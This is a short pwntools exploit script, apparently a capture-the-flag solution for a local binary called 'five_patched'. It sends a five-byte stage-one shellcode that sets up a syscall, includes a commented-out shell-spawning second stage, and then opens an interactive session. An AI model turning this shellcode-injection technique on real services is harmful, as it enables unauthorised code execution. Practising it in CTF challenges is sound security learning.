#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./five_patched", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}

stage1 = """
push r12
jmp rcx
"""

stage1 = """
sub cl, 2
jmp rcx
"""

stage1 = """
syscall
"""

# stage1 = "nop"

# stage1 = asm(stage1)
stage1 = (b"\x99\xff\xca\x0f\x05")
# stage1 = (b"\x96\x99\x93\x0f\x05")
print(len(stage1))
print(stage1.hex())
# stage2 = b"\x90" * len(stage1) + asm(shellcraft.sh())

io = start()

pause()
io.send(stage1)
# time.sleep(0.1)
# io.send(stage2)

# for i in range(20):
#     pause()
#     io.send(b"\x48\x83\xEC\x18\xc3")

io.interactive()
